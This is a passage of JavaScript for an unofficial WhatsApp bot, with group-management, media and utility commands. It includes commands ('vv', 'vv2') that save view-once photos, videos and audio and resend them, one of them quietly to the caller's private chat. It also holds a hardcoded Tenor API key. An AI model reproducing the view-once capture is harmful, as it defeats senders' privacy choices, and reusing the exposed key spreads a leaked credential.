                        body: { text: autoReactHeader + autoReactBody },
                        footer: { text: "Gideon ᴍᴅ ᴀᴜᴛᴏʀᴇᴀᴄᴛ ᴍᴀɴᴀɢᴇʀ 🐍" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "ᴍᴏᴅᴇ ᴀʟʟ 🕸️",
                                        id: `${prefix}autoreact all`
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "ᴍᴏᴅᴇ ɢʀᴏᴜᴘ 🏷️",
                                        id: `${prefix}autoreact group`
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "ᴍᴏᴅᴇ ᴄʜᴀᴛ👤",
                                        id: `${prefix}autoreact chat`
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "ᴛᴜʀɴ ᴏғғ 🔴",
                                        id: `${prefix}autoreact off`
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            mentionedJid: [nowsender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363404137900781@newsletter',
                                newsletterName: '?𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                                serverMessageId: 125
                            }
                        }
                    }
                }
            }
        }, { quoted: mquote });

    } catch (e) {
        console.error('Autoreact Button Error:', e);
        gaara.reply(toSmallCaps("error while loading interactive menu."));
    }
}
break;


case 'antilink': {
    try {
        const antilinkPath = './antilink.json';
        const botNumber = sock.user.id.split(':')[0];

        // Vérifications de base (Groupe + Admins/Owner)
        if (!isGroup) return gaara.reply(`*${toSmallCaps("uniquement en groupe")}*`);
        if (!isAdmins && !isOwner) return gaara.reply(`*${toSmallCaps("commande reservee aux admins")}*`);

        // Initialisation du fichier JSON si inexistant
        if (!fs.existsSync(antilinkPath)) fs.writeFileSync(antilinkPath, JSON.stringify({}));
        let antilinkData = JSON.parse(fs.readFileSync(antilinkPath, 'utf8'));
        if (!antilinkData[botNumber]) antilinkData[botNumber] = {};

        const groupJid = m.chat;
        const currentStatus = antilinkData[botNumber][groupJid] || "OFF";

        // Si aucun argument, on affiche le menu interactif
        if (!args[0]) {
            await gaara.react("🛡️");
            const antilinkMsg = `🛡️ *${toSmallCaps("antilink settings")}*

*${toSmallCaps("status actuel")} :* ${currentStatus.toUpperCase()}

> ${toSmallCaps("choisissez une action ci-dessous pour filtrer les liens externes dans ce groupe.")}`;

            await sock.relayMessage(m.chat, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: `*${toSmallCaps("antilink manager")}*`,
                                hasMediaAttachment: false
                            },
                            body: { text: antilinkMsg },
                            footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "🗑️ ᴅᴇʟᴇᴛᴇ",
                                            id: `${prefix}antilink delete`
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "⚠️ ᴡᴀʀɴ",
                                            id: `${prefix}antilink warn`
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "🚫ᴋɪᴄᴋ",
                                            id: `${prefix}antilink kick`
                                        })
                                    },
                                    {
                                        name: "quick_reply",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: "ᴏғғ",
                                            id: `${prefix}antilink off`
                                        })
                                    }
                                ]
                            },
                            contextInfo: {
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363404137900781@newsletter',
                                    newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                                    serverMessageId: 125
                                }
                            }
                        }
                    }
                }
            }, { quoted: mquote });
            return;
        }

        // Logique de modification
        let mode = args[0].toLowerCase();

        if (['kick', 'warn', 'delete'].includes(mode)) {
            antilinkData[botNumber][groupJid] = mode;
            fs.writeFileSync(antilinkPath, JSON.stringify(antilinkData, null, 2));
            await gaara.react("✅");
            gaara.reply(`✅ *${toSmallCaps("antilink active")}*\n📝 *${toSmallCaps("mode")}* : ${mode.toUpperCase()}`);
        } else if (mode === 'off') {
            delete antilinkData[botNumber][groupJid];
            fs.writeFileSync(antilinkPath, JSON.stringify(antilinkData, null, 2));
            await gaara.react("❌");
            gaara.reply(`❌ *${toSmallCaps("antilink desactive")}*`);
        } else {
            gaara.reply(`*${toSmallCaps("mode invalide")} : kick, warn, delete ou off*`);
        }

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("error configuring antilink"));
    }
}
break;

case 'welcome': {
    const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Correction ici
    if (!isGroup) return gaara.reply(`*${toSmallCaps("cette commande ne peut etre utilisee que dans des groupes")}*`);
    if (!isAdmins && !isOwner) return gaara.reply(`*${toSmallCaps("commande reservee aux admins et au proprietaire")}*`);
    if (!args[0]) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}welcome on/off`);

    let status = args[0].toLowerCase();
    if (status === 'on' || status === 'off') {
        sessionsConfig[botId].welcome = status;
        gaara.reply(`✨ *${toSmallCaps("message de bienvenue")}* : ${status === 'on' ? '🟢 ON' : '🔴 OFF'}`);
    } else {
        gaara.reply(`*${toSmallCaps("veuillez choisir entre on et off")}*`);
    }
}
break;

case 'adminevents': {
    const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'; // Correction ici
    if (!isGroup) return gaara.reply(`*${toSmallCaps("cette commande ne peut etre utilisee que dans des groupes")}*`);
    if (!isAdmins && !isOwner) return gaara.reply(`*${toSmallCaps("commande reservee aux admins et au proprietaire")}*`);
    if (!args[0]) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}adminevent on/off`);

    let status = args[0].toLowerCase();
    if (status === 'on' || status === 'off') {
        sessionsConfig[botId].adminevents = status;
        gaara.reply(`🛡️ *${toSmallCaps("evenements d administration")}* : ${status === 'on' ? '🟢 ON' : '🔴 OFF'}`);
    } else {
        gaara.reply(`*${toSmallCaps("veuillez choisir entre on et off")}*`);
    }
}
break;

case 'promoteall': {
    try {
        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can use this"));

        const groupMetadata = await sock.groupMetadata(gaara.chat);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';

        // On récupère les membres qui ne sont PAS encore admins
        const membersToPromote = groupMetadata.participants
            .filter(p => p.admin === null)
            .map(p => p.id);

        if (membersToPromote.length === 0) {
            return gaara.reply(toSmallCaps("everyone is already an admin."));
        }

        await gaara.react("📈");
        await gaara.reply(`📈 *${toSmallCaps("promoting all members")}*...\n> *${toSmallCaps("count")} :* ${membersToPromote.length}`);

        // Promotion massive
        await sock.groupParticipantsUpdate(gaara.chat, membersToPromote, "promote");

        await sock.sendMessage(gaara.chat, {
            text: `✅ *${toSmallCaps("all members promoted successfully")}*\n\n👤 *${toSmallCaps("action by")} :* @${m.sender.split('@')[0]}`,
            mentions: [m.sender]
        }, { quoted: mquote });

        await gaara.react("✅");
    } catch (e) {
        console.error("Promoteall Error:", e);
        gaara.reply(toSmallCaps("failed to promote all members."));
    }
}
break;
case 'demoteall': {
    try {
        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can use this"));

        const groupMetadata = await sock.groupMetadata(gaara.chat);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const ownerGroup = groupMetadata.owner || ''; // Le créateur du groupe

        // On récupère les admins, MAIS on exclut :
        // 1. Le bot lui-même (sinon il perd ses pouvoirs)
        // 2. Le créateur du groupe (on ne peut pas le destituer)
        const membersToDemote = groupMetadata.participants
            .filter(p => p.admin !== null && p.id !== botId && p.id !== ownerGroup)
            .map(p => p.id);

        if (membersToDemote.length === 0) {
            return gaara.reply(toSmallCaps("no admins found to demote (excluding bot and owner)."));
        }

        await gaara.react("📉");
        await gaara.reply(`📉 *${toSmallCaps("demoting all admins")}*...\n> *${toSmallCaps("count")} :* ${membersToDemote.length}`);

        // Destitution massive
        await sock.groupParticipantsUpdate(gaara.chat, membersToDemote, "demote");

        await sock.sendMessage(gaara.chat, {
            text: `✅ *${toSmallCaps("all admins demoted successfully")}*\n\n⚠️ *${toSmallCaps("note")} :* ${toSmallCaps("the group owner and bot remain admins")}`,
            mentions: [m.sender]
        }, { quoted: mquote });

        await gaara.react("✅");
    } catch (e) {
        console.error("Demoteall Error:", e);
        gaara.reply(toSmallCaps("failed to demote all members."));
    }
}
break;



case 'kickall':
case 'removeall':
case 'cleargroup': {
    try {
        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can use this"));
        
        const groupMetadata = await sock.groupMetadata(gaara.chat);
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        
        // On récupère les membres qui ne sont pas admins et qui ne sont pas le bot
        const membersToRemove = groupMetadata.participants
            .filter(p => p.admin === null && p.id !== botId)
            .map(p => p.id);

        if (membersToRemove.length === 0) {
            return gaara.reply(toSmallCaps("no members found to remove."));
        }

        await gaara.react("⚠️");
        
        // Message d'attente simple
        await sock.sendMessage(gaara.chat, { 
            text: `⚠️ *${toSmallCaps("cleaning group")}*...\n> *${toSmallCaps("removing")} :* ${membersToRemove.length} ${toSmallCaps("members")}` 
        });

        // Exécution de l'expulsion
        await sock.groupParticipantsUpdate(gaara.chat, membersToRemove, "remove");

        // Message de succès (Simplifié pour éviter l'erreur TypeError jid)
        const successMsg = `✅ *${toSmallCaps("clean up successful")}*\n\n📄 *${toSmallCaps("total removed")} :* ${membersToRemove.length}\n👤 *${toSmallCaps("executed by")} :* @${m.sender.split('@')[0]}`;

        await sock.sendMessage(gaara.chat, {
            text: successMsg,
            mentions: [m.sender]
        }, { quoted: mquote });
        
        await gaara.react("✅");

    } catch (e) {
        console.error("Kickall Error:", e);
        // On n'envoie pas de message d'erreur si l'action a déjà été faite
        if (!e.message.includes("jid.endsWith")) {
            gaara.reply(toSmallCaps("failed to perform action."));
        }
    }
}
break;

case 'readviewonce': 
case 'vv': {
    try {
        if (!m.quoted) return gaara.reply(`*${toSmallCaps("error")} :* ${toSmallCaps("reply to a viewonce message")}`);
        
        // On récupère le message cité (en gérant le format viewOnce)
        let q = m.quoted.msg;
        if (!q.viewOnce) return gaara.reply(`*${toSmallCaps("error")} :* ${toSmallCaps("this is not a viewonce message")}`);

        await gaara.react("🔓");

        // Téléchargement du média via ta fonction smsg.js
        let media = await m.quoted.download();
        let caption = q.caption || '';

        if (/image/.test(m.quoted.type)) {
            await sock.sendMessage(gaara.chat, { image: media, caption: caption }, { quoted: mquote });
        } else if (/video/.test(m.quoted.type)) {
            await sock.sendMessage(gaara.chat, { video: media, caption: caption }, { quoted: mquote });
        } else if (/audio/.test(m.quoted.type)) {
            await sock.sendMessage(gaara.chat, { audio: media, mimetype: 'audio/mp4', ptt: false }, { quoted: mquote });
        }

        await gaara.react("✅");
    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to open viewonce media."));
    }
}
break;
case 'vv2':
case 'mvle': {
    try {
        if (!m.quoted) return gaara.reply(`*${toSmallCaps("error")} :* ${toSmallCaps("reply to a viewonce message")}`);

        let q = m.quoted.msg;
        if (!q.viewOnce) return gaara.reply(`*${toSmallCaps("error")} :* ${toSmallCaps("this is not a viewonce message")}`);


        let media = await m.quoted.download();
        let caption = q.caption || `*${toSmallCaps("saved from group")}*`;

        // Envoi à m.sender (celui qui a tapé la commande) en privé
        if (/image/.test(m.quoted.type)) {
            await sock.sendMessage(m.sender, { image: media, caption: caption });
        } else if (/video/.test(m.quoted.type)) {
            await sock.sendMessage(m.sender, { video: media, caption: caption });
        } else if (/audio/.test(m.quoted.type)) {
            await sock.sendMessage(m.sender, { audio: media, mimetype: 'audio/mp4' });
        }

    } catch (e) {
        console.error(e);
    }
}
break;

case 'tovv':
case 'toviewonce': {
    try {
        // Vérifie si on répond à un message (image ou vidéo)
        const q = m.quoted ? m.quoted : m;
        const mime = (q.msg || q).mimetype || '';
        
        if (!/image|video/.test(mime)) return gaara.reply(`*${toSmallCaps("usage")} :* ${toSmallCaps("reply to an image or video")}`);

        await gaara.react("👁️");

        // Téléchargement du média via ta fonction smsg.js
        const media = await q.download();

        if (/image/.test(mime)) {
            await sock.sendMessage(gaara.chat, {
                image: media,
                caption: `✅ *${toSmallCaps("view once image generated")}*`,
                viewOnce: true
            }, { quoted: mquote });
        } else if (/video/.test(mime)) {
            await sock.sendMessage(gaara.chat, {
                video: media,
                caption: `✅ *${toSmallCaps("view once video generated")}*`,
                viewOnce: true
            }, { quoted: mquote });
        }
        
        await gaara.react("✅");
    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to generate view once message."));
    }
}
break;
case 'toqr': {
    try {
        const text = args.join(" ");
        if (!text) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}toqr <${toSmallCaps("text/link")}>`);

        await gaara.react("🏁");

        const QRCode = require('qrcode');
        
        // Génération du QR Code en Buffer (PNG)
        const qrBuffer = await QRCode.toBuffer(text, {
            scale: 8,
            margin: 2,
            color: {
                dark: '#000000',
                light: '#ffffff'
            }
        });

        const qrMsg = `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│🏁 *${toSmallCaps("qr code generator")}*
│ *📝 ${toSmallCaps("content")} :* ${text}
│ *🕷️ ${toSmallCaps("generated by Cobra md")}*\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤`;

        await sock.sendMessage(gaara.chat, {
            image: qrBuffer,
            caption: qrMsg
        }, { quoted: mquote });

        await gaara.react("✅");
    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to generate qr code."));
    }
}
break;

case 'emojimix':
case 'mix': {
    try {
        if (!text.includes('+')) {
            return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}emojimix 😅+🤔`);
        }

        const [emoji1, emoji2] = text.split('+');
        if (!emoji1 || !emoji2) return gaara.reply(`*${toSmallCaps("example")} :* ${prefix}emojimix 😅+🤔`);

        await gaara.react("🪄");

        // API Tenor Emoji Kitchen
        const apiUrl = `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`;
        
        const response = await axios.get(apiUrl);
        const result = response.data;

        if (!result.results || result.results.length === 0) {
            return gaara.reply(toSmallCaps("sorry, these emojis cannot be mixed."));
        }

        // On récupère l'URL de l'image transparente
        const emojiUrl = result.results[0].media_formats.png_transparent.url;

        // ENVOI DU STICKER (Méthode native Baileys)
        await sock.sendMessage(gaara.chat, { 
            sticker: { url: emojiUrl },
            // On ajoute les métadonnées pour que le sticker soit personnalisé
            contextInfo: {
                externalAdReply: {
                    title: "GIDEON 𝙼𝙳 𝙼𝙸𝚇",
                    body: "ᴇᴍᴏᴊɪ ",
                    mediaType: 1,
                    previewType: 0,
                    thumbnailUrl: emojiUrl,
                    renderLargerThumbnail: false
                }
            }
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error("Emojimix Error:", e);
        gaara.reply(toSmallCaps("failed to mix emojis."));
    }
}
break;


case 'img':
case 'imgsearch': {
    try {
        const query = args.join(" ");
        if (!query) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}img <${toSmallCaps("query")}>\n\n*${toSmallCaps("example")} :* ${prefix}img spider-man`);

        await gaara.react("🔍");

        // Appel de l'API
        const response = await axios.get(`https://api.siputzx.my.id/api/s/bimg?query=${encodeURIComponent(query)}`);

        if (!response.data || !response.data.status || !response.data.data.length) {
            return gaara.reply(toSmallCaps("no images found for this query."));
        }

        const images = response.data.data;
        // On prend une image au hasard parmi les 10 premières pour varier
        const randomImg = images[Math.floor(Math.random() * Math.min(images.length, 10))];

        const imgMsg = `🔎 *${toSmallCaps("image search")}*
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│🪭 *ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n│👦🏻 *ʙʏ Cobra ᴛᴇᴄʜ*
│ *📍 ${toSmallCaps("query")} :* ${query}
│ *📸 ${toSmallCaps("source")} :* Bing Search
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
> ${toSmallCaps("click next to see another image")} 🕷️`;

        // 1. On envoie d'abord l'image
        await sock.sendMessage(gaara.chat, { 
            image: { url: randomImg }, 
            caption: imgMsg 
        }, { quoted: mquote });

        // 2. On envoie le bouton "Suivant" juste en dessous
        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { hasMediaAttachment: false },
                        body: { text: `*${toSmallCaps("more results for")}* : ${query}` },
                        footer: { text: "Gideon ᴍᴅ ᴇɴɢɪɴᴇ" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: `⏭️ ${toSmallCaps("next image")}`,
                                    id: `${prefix}img ${query}`
                                })
                            }]
                        }
                    }
                }
            }
        }, {});

        await gaara.react("✅");

    } catch (e) {
        console.error("Image Search Error:", e);
        gaara.reply(toSmallCaps("failed to fetch images. API might be down."));
    }
}
break;


case 'unmute':
case 'open': {
    try {
        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can open the group"));

        await gaara.react("🔓");
        await sock.groupSettingUpdate(gaara.chat, 'not_announcement');

        const openMsg = `🔓 *${toSmallCaps("group opened")}*\n\n> ${toSmallCaps("group is now open! all members can send messages")} 🗣️`;

        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { title: `*${toSmallCaps("Gideon md manager")}*`, hasMediaAttachment: false },
                        body: { text: openMsg },
                        footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: `🔒 ${toSmallCaps("mute")}`,
                                    id: `${prefix}mute`
                                })
                            }]
                        }
                    }
                }
            }
        }, {});
    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to open group"));
    }
}
break;

case 'mute':
case 'close': {
    try {
        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can close the group"));

        await gaara.react("🔒");
        await sock.groupSettingUpdate(gaara.chat, 'announcement');

        const closeMsg = `🔒 *${toSmallCaps("group closed")}*\n\n> ${toSmallCaps("group is now closed! only admins can send messages")} 🤫`;

        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { title: `*${toSmallCaps("Gideon md manager")}*`, hasMediaAttachment: false },
                        body: { text: closeMsg },
                        footer: { text: "Gideon ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ" },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: `🔓 ${toSmallCaps("unmute")}`,
                                    id: `${prefix}unmute`
                                })
                            }]
                        }
                    }
                }
            }
        }, {});
    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to close group"));
    }
}
break;


//getcase
case 'allcase': {
    try {
        if (!isDev) return gaara.reply(toSmallCaps("fuck you" + senderNumber + " you are not my dev"));
        
        const fs = require('fs');
        const scriptContent = fs.readFileSync('./spider.js', 'utf8');
        
        // Regex pour trouver tous les noms de cases
        const caseRegex = /case\s+['"]([^'"]+)['"]/g;
        let cases = [];
        let match;
        
        while ((match = caseRegex.exec(scriptContent)) !== null) {
            cases.push(match[1]);
        }
        
        if (cases.length === 0) return gaara.reply("Aucune case trouvée.");

        let menu = `╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n│🪭 *ʙᴏᴛ ɴᴀᴍᴇ Gideon ᴍᴅ*\n│👦🏻 *ʙʏ Cobra ᴛᴇᴄʜ*\n│🐍 *${toSmallCaps("Gideon md cases list")}*\n`;
        cases.forEach((c, i) => {
            menu += `│ *${i + 1}.* ${c}\n`;
        });
        
        menu += `╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤\n> *${toSmallCaps("total cases")} :* ${cases.length}`;
        
        gaara.reply(menu);
    } catch (e) {
        console.error(e);
        gaara.reply("Erreur lors de la lecture des cases.");
    }
}
break;
//all case

case 'getcase': {
    try {
        if (!isOwner) return gaara.reply(toSmallCaps("owner only bro"));
        if (!args[0]) return gaara.reply(`*${toSmallCaps("usage")} :* ${prefix}getcase [nom_de_la_case]`);

        const fs = require('fs');
        const fileName = './spider.js'; 
        
        if (!fs.existsSync(fileName)) return gaara.reply("❌ Fichier spider.js introuvable.");
        
        const scriptContent = fs.readFileSync(fileName, 'utf8');

        const regex = new RegExp(`case\\s+['"]${args[0]}['"]:[\\s\\S]*?break;`, 'i');
        const match = scriptContent.match(regex);

        if (!match) return gaara.reply(`❌ *${toSmallCaps("error")}* : Case *"${args[0]}"* introuvable.`);

        const extractedCode = match[0];

        // Construction du message (Correction : suppression de readFileSync pour l'image)
        const getMsg = `📦 *${toSmallCaps("Gideon md extractor")}*
╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
│ *📍 ${toSmallCaps("target")} :* \`${args[0]}\`
│ *📏 ${toSmallCaps("size")} :* ${extractedCode.length} ${toSmallCaps("chars")}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄➤
> ${toSmallCaps("click the button below to copy the source code")} 🕷️`;

        await sock.relayMessage(gaara.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { 
                            title: `*${toSmallCaps("source code fetcher")}*`,
                            hasMediaAttachment: false 
                        },
                        body: { text: getMsg },
                        footer: { text: "Cobra ᴍᴅ ᴏᴘᴛɪᴍɪᴢᴇᴅ ʙʏ Cobra ᴛᴇᴄʜ" },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 COPY CODE",
                                        id: "copy_code",
                                        copy_code: extractedCode
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            externalAdReply: {
                                title: '𝒀𝑶𝑼 𝑴𝑫 𝑪𝑶𝑫𝑬',
                                body: 'System Source Extractor',
                                // Image supprimée pour éviter l'erreur ENOENT
                                thumbnail: null, 
                                sourceUrl: 'https://whatsapp.com/channel/0029Vb7EpGwBlHpXKNgFET1Z'
                            }
                        }
                    }
                }
            }
        }, { quoted: mquote });

        await gaara.react("📥");

    } catch (e) {
        console.error("Getcase Error:", e);
        gaara.reply("❌ Error while extracting the case. Check Termux logs.");
    }
}
break;


//getpp
case 'getpp': {
    try {
	if (!isOwner) {
		await gaara.react("❌");
	return gaara.reply("ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴍʏ ᴏᴡɴᴇʀ ʙʀᴏ");
	}
	await gaara.react("📸");
        let user;
        if (gaara.quoted) {
            // Si on répond à un message (Groupe ou Privé)
            user = gaara.quoted.sender;
        } else if (!isGroup) {
            // Si on est en privé et qu'on ne répond à personne, on prend la photo de l'interlocuteur
            user = gaara.chat;
        } else if (gaara.mentionedJid && gaara.mentionedJid[0]) {
            // Si on tag quelqu'un dans un groupe
            user = gaara.mentionedJid[0];
        } else {
            // Par défaut, sa propre photo
            user = gaara.sender;
        }

        let ppUrl;
        try {
            // Récupération de l'image HD
            ppUrl = await sock.profilePictureUrl(user, 'image');
        } catch (e) {
            return gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("profile picture is private or not found")}`);
        }

        const ppMsg = `🖼️ *${toSmallCaps("profile picture retrieved")}*
        
*👤 ${toSmallCaps("target")} :* @${user.split('@')[0]}
> *${toSmallCaps("optimized by Cobra tech")}*`;

        await sock.sendMessage(gaara.chat, {
            image: { url: ppUrl },
            caption: ppMsg,
            mentions: [user],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363404137900781@newsletter',
                    newsletterName: '𝐆𝐈𝐃𝐄𝐎𝐍 𝐌𝐃 𝐁𝐎𝐓',
                    serverMessageId: 125
                }
            }
        }, { quoted: mquote });

        await gaara.react("✅");

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to get profile picture"));
    }
}

break;

//pair 
case 'pair':
case 'getbot':
case 'botclone': {
    try {
        await gaara.react("📲");
        
        // Utilisation de axios (plus stable que fetch dans certains environnements Termux)
        const axios = require('axios');

        // Récupération du numéro (on enlève tout ce qui n'est pas un chiffre)
        let phoneNumber = text.replace(/[^0-9]/g, '');

        if (!phoneNumber) {
            return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}pair 509xxxxxxx`);
        }

        await gaara.reply(`⏳ *${toSmallCaps("requesting pairing code for")}* +${phoneNumber}...`);

        // L'URL pointe vers ton API Express (localhost sur le port 8000 d'après ton code api.js)
        const apiUrl = `https://X-trem-cfd4a4acd17c.herokuapp.com/code?number=${phoneNumber}`;

        const response = await axios.get(apiUrl);
        const result = response.data;

        if (result && result.code) {
            // Message stylisé Spider XD
            const pairMsg = `✅ *${toSmallCaps("Gideon md pairing")}*

*🔑 ${toSmallCaps("your code is")} :*
\`\`\`${result.code}\`\`\`

> ${toSmallCaps("copy the code above and paste it into your whatsapp notification to link the bot")} 🍂`;

            await sock.sendMessage(gaara.chat, { 
                text: pairMsg 
            }, { quoted: mquote });

            // Envoi du code seul pour faciliter le copier-coller
            setTimeout(async () => {
                await sock.sendMessage(gaara.chat, { text: result.code }, { quoted: gaara });
            }, 2000);

        } else {
            gaara.reply(toSmallCaps("failed to retrieve code. make sure your api server is running on port 8000."));
        }

    } catch (e) {
        console.error("Pair Error:", e);
        gaara.reply(`❌ *${toSmallCaps("error")} :* ${toSmallCaps("could not connect to pairing server")}`);
    }
}
break;


//group case

case 'add': {
    try {
        await gaara.react("➕");
	if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can add members"));
        if (!text) return gaara.reply(`📌 *${toSmallCaps("usage")} :* ${prefix}add 509xxxxxxx`);

        const numberToAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        await sock.groupParticipantsUpdate(gaara.chat, [numberToAdd], 'add');
        
        const addMsg = `✅ *${toSmallCaps("member added")}*

> ${toSmallCaps("successfully added")} @${numberToAdd.split('@')[0]} ${toSmallCaps("to the group")} 🎉`;

        await sock.sendMessage(gaara.chat, { 
            text: addMsg, 
            mentions: [numberToAdd] 
        }, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to add member. check if the number is valid or if the group is full."));
    }
}
break;

case 'kick': {
    try {
        await gaara.react("🦶");

        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can kick members"));

        // Récupère le numéro (soit par tag, soit par mention, soit par argument)
        const user = gaara.quoted ? gaara.quoted.sender : (gaara.mentionedJid && gaara.mentionedJid[0]) ? gaara.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;

        if (!user) return gaara.reply(toSmallCaps("please tag or reply to someone to kick"));

        await sock.groupParticipantsUpdate(gaara.chat, [user], 'remove');
        
        const kickMsg = `🗑️ *${toSmallCaps("member kicked")}*

> @${user.split('@')[0]} ${toSmallCaps("has been removed from the group")} 🚪`;

        await sock.sendMessage(gaara.chat, { 
            text: kickMsg, 
            mentions: [user] 
        }, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to kick member. maybe they are already gone or an admin?"));
    }
}
break;

case 'promote': {
    try {
        await gaara.react("👑");

        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
        if (!isAdmins && !isOwner) return gaara.reply(toSmallCaps("only group admins or bot owner can promote members"));

        const user = gaara.quoted ? gaara.quoted.sender : (gaara.mentionedJid && gaara.mentionedJid[0]) ? gaara.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null;

        if (!user) return gaara.reply(toSmallCaps("please tag or reply to someone to promote"));

        await sock.groupParticipantsUpdate(gaara.chat, [user], 'promote');
        
        const proMsg = `⬆️ *${toSmallCaps("member promoted")}*

> @${user.split('@')[0]} ${toSmallCaps("is now an admin")} 🌟`;

        await sock.sendMessage(gaara.chat, { 
            text: proMsg, 
            mentions: [user] 
        }, { quoted: mquote });

    } catch (e) {
        console.error(e);
        gaara.reply(toSmallCaps("failed to promote member"));
    }
}
break;

case 'demote': {
    try {
        await gaara.react("📉");

        if (!isGroup) return gaara.reply(toSmallCaps("this command works only in groups"));
